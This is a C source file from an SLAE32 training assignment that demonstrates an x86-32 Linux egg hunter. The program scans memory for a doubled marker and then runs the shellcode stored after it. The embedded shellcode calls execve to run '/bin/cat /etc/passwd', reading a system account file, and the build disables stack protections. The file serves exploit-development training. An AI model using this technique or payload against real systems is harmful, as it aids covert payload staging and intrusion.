/*
	Jean-Pierre LESUEUR (@DarkCoderSc)
	jplesueur@phrozen.io
	https://www.phrozen.io/
	https://github.com/darkcodersc

	License : MIT

	---

	SLAE32 Assignment 3 : Linux x86-32 Egg Hunter Research.

	---

	gcc egg-shellcode-embedded.c -o egg-shellcode-embedded -z execstack -no-pie -fno-stack-protector
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <math.h>

unsigned int page_size = 0;
char egg[8] = "21676765"; // egg! (Little Endian)

/*****************************************************************************************************

	Define our shellcode to search in memory.

	EGG|EGG|OpCode

*****************************************************************************************************/
unsigned char shellcode[] = \
	"\x65\x67\x67\x21" // egg!
	"\x65\x67\x67\x21" // egg!

	// OpCode
	"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f"
	"\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x73"
	"\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x20\x2f\x65\x74\x68\x2f\x63"
	"\x61\x74\x68\x2f\x62\x69\x6e\x89\xe6\x50\x56\x52\x53\x89\xe1\x50"
	"\x89\xe2\xb0\x0b\xcd\x80";

/****************************************************************************************************

	Check memory region for an egg ! 
		(\__/)	
		( ._.) <3
		(°°)(°°)
		_____________________

****************************************************************************************************/
_Bool egg_hunt(unsigned int *ptr, char *egg_name, _Bool access_chk) {
	/*
		Safety control to be sure, we are not reading a bad memory region.
	*/
	_Bool access_violation = 0;
	if (access_chk) {
		/*
			access_chk is optional, it is useless to call access() on first egg check since we already
			know we have access to that memory address.

			When we try to test next address (for control egg), we must call access() to be sure it is still 
			in a valid memory region.

			(!) Keeping access_chk always on will slow down overall performance for egg hunting.
		*/
		access_violation = ((access((char *) ptr, F_OK) == -1) && (errno == EFAULT));
	}

	if (!access_violation) {
		char addr[9]; // Address 4Bytes => (Hex = 8 Bytes) + NULL (1B) = 9;

		snprintf(addr, sizeof(addr), "%08x", *ptr);

		if (strcmp(addr, egg_name) == 0) {			
			return 1;
		}
	}


	///
	return 0;
}

/****************************************************************************************************

	Search for an egg in memory and return its address.

	Safely walk through memory page by page.

	// Scenario:
	if walk.address = str("EGG") then
		walk.next_address
		if walk.address = str("EGG") then
			walk.next_address			
			run(opcode(next_address)

****************************************************************************************************/
unsigned int egg_hunter() {
	unsigned int max_page = (pow(2, 32) / page_size); // 2^32 = Max memory size for 32bit systems.
	unsigned int page_cursor = 0; // Current memory page.
	unsigned int mem_cursor = 0; // Current memory cursor (relative to page_cursor).		
	_Bool found = 0; // egg presence flag

	/*
		Walk through memory page by page.
	*/	
	for (unsigned int i = 0; i < max_page; i++) {
		page_cursor = (i * page_size);
		///

		/*
			Check if we have access to current memory page.
		*/
		if ((access((char *) page_cursor, F_OK) == -1) && (errno == EFAULT)) {
			/*
				We don't have access to that memory region. Next!
			*/
			continue;
		} else {		
			/*
				If we have access to memory page, walk through page memory
				bytes by bytes until page end.
			*/
			for (unsigned int n = 0; n < (page_size -3); n++) {
				mem_cursor = (page_cursor + n);
				///

				unsigned int *ptr = (unsigned int *) mem_cursor; // Pointer to current memory location.
			
				if (egg_hunt(ptr, egg, 0 /* We already know memory address is valid */)) {								
					ptr++;
					///

					if (egg_hunt(ptr, egg, 1 /* We want to test memory address */)) {
						ptr++;
						///						

						return (unsigned int) ptr;						
					}
				}
			}
		}
	}

	///
	return 0;
}


/****************************************************************************************************

	Program Entry Point

****************************************************************************************************/
void main() {
	/*
		Get current defined page size. On Linux it is generally 4kiB (4096).
	*/
	page_size = sysconf(_SC_PAGESIZE); 		

	/*
		Hunt egg and trigger shellcode.
	*/
	printf("Search for egg pattern: 0x%s\n", egg);
	unsigned int shellcode_addr = egg_hunter();

	if (shellcode_addr == 0) {
		printf("Egg pattern not found in memory!\n");
	} else {
		printf("Execute shellcode at address 0x%x\n", shellcode_addr);	

		void (*shellcode_proc) (void);
		shellcode_proc = (void *)shellcode_addr;
		shellcode_proc();   		
	}	

	return;
}
